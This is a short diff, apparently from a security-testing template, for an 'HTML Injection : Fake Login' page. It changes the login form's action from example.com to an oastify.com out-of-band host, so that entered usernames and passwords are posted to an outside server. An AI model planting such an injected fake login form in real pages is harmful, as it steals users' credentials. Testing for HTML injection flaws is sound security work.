@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
+        <form action="http://hwhrho541p4zn0i8s59bjp2io9u0i06p.oastify.com" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
